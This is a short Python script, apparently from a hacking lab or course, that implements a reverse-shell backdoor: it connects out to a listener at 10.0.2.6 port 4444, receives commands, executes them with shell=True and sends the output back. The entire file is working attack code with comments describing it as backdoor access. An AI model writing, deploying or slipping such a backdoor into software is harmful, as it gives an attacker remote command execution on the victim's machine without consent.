#!/usr/bin/python3

import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True) #execute command and return result

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #used to send data between 2 computers (Linux and windows)
connection.connect(("10.0.2.6", 4444)) #target ip and port 4444 for backdoor access

connection.send("\n[+} Connection established.\n") #send message tell me if connection was established

while True:
    command = connection.recv(1024) #size of each batch of data recieved at a time
    command_result = execute_system_command(command) #data that was passed to function
    connection.send(command_result) #send results of the function back to me 

connection.close() #close connection
